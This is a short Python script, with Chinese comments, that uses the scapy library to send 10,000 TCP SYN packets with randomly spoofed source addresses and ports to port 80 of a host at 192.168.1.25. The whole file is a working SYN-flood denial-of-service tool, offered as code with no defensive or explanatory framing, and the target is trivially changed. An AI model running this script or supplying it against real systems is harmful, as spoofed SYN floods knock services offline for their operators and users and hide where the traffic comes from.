from scapy.all import *
import random
 
def synFlood():
    for i in range(10000):
        #构造随机的源IP
        src='%i.%i.%i.%i'%(
            random.randint(1,255),
            random.randint(1, 255),
            random.randint(1, 255),
            random.randint(1, 255)
            )
        #构造随机的端口
        sport=random.randint(1024,65535)
        IPlayer=IP(src=src,dst='192.168.1.25')
        TCPlayer=TCP(sport=sport,dport=80,flags="S")
        packet=IPlayer/TCPlayer
        send(packet)
 
if __name__ == '__main__':
    synFlood()